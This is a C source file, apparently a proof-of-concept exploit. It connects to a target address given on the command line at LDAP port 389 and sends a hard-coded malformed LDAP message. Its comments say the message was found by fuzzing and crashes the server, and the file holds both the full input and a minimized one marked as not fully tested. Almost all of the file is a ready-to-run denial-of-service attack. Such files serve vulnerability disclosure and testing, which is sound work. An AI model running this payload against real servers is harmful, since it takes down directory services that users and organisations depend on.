// This program accepts either an ipv6 or ipv4 address as input.
// The target port is 389 by default.

#include <arpa/inet.h>
#include <netdb.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

int main(int argc, char *argv[]) {
  // Complete input discovered durring fuzzing
  //  const uint8_t crashMessage[] = {
  //      0x30, 0x5d, 0x02, 0x01, 0x02, 0x63, 0x2f, 0x04, 0x00, 0x0a, 0x01,
  //      0x02, 0x0a, 0x81, 0x00, 0xa8, 0x02, 0x01, 0x00, 0x02, 0x01, 0x00,
  //      0x01, 0x01, 0x00, 0xa8, 0x02, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00,
  //      0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  //      0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  //      0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  //      0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  //      0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  //      0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  //      0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  //      0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xff, 0xff, 0xff, 0xff, 0x00,
  //      0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  //      0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  //      0x01, 0x63, 0x6e, 0x3d, 0x62, 0x64, 0x62, 0x62, 0x30, 0x0f, 0xac,
  //      0xac, 0xac, 0xac, 0xac, 0xac, 0xac, 0xac, 0xb6, 0xac, 0xac, 0xac,
  //      0xac, 0xac, 0xac, 0xac, 0xac, 0xac, 0xac, 0xac, 0xac, 0xac, 0xac,
  //      0xac, 0x01, 0x08, 0xac, 0xac, 0xac, 0xac, 0xac, 0xac, 0xac, 0xac,
  //      0xac, 0x04, 0xf6, 0xff, 0xff, 0x6c, 0xff, 0x26, 0xff, 0xff, 0xff,
  //      0xff, 0x00, 0x00, 0x00, 0x00, 0x63, 0x27, 0x6e, 0x3d, 0x61, 0x75,
  //      0x00, 0x00, 0xac, 0xac, 0xac, 0xac, 0xac, 0x04, 0x6c, 0x26, 0xf6};

  // Minimized input below should work, but has not been fully tested.
  const uint8_t crashMessage[] = {
      0x30, 0x34, 0x02, 0x01, 0x02, 0x63, 0x2f, 0x04, 0x00, 0x0a, 0x01,
      0x00, 0x0a, 0x01, 0x00, 0x06, 0x01, 0x00, 0x82, 0x01, 0x00, 0xff,
      0xff, 0x7e, 0x03, 0x14, 0x88, 0x3f, 0xa9, 0x01, 0x63, 0x6e, 0x3d,
      0x70, 0x61, 0x73, 0x73, 0x77, 0x6f, 0x72, 0x64, 0x20, 0x73, 0x74,
      0x6f, 0x72, 0x61, 0x67, 0x65, 0x20, 0x73, 0x63, 0x68, 0x65};

  struct addrinfo hints, *result, *res;
  char *port = "389";
  struct sockaddr_in6 server_addr;
  int sockfd, socketinfo;

  memset(&hints, 0, sizeof(hints));
  hints.ai_family = AF_UNSPEC;
  hints.ai_socktype = SOCK_STREAM;

  socketinfo = getaddrinfo(argv[1], port, &hints, &result);
  if (socketinfo != 0) {
    printf("Error: %s\n", gai_strerror(socketinfo));
    exit(1);
  }

  for (res = result; res != NULL; res = res->ai_next) {
    sockfd = socket(res->ai_family, res->ai_socktype, res->ai_protocol);
    if (sockfd == -1)
      continue;
    if (connect(sockfd, res->ai_addr, res->ai_addrlen) == 0)
      break;
  }
  freeaddrinfo(result);
  if (res == NULL) {
    printf("Bind failed\n");
    exit(1);
  }
  send(sockfd, crashMessage, sizeof(crashMessage), 0);
  close(sockfd);
}
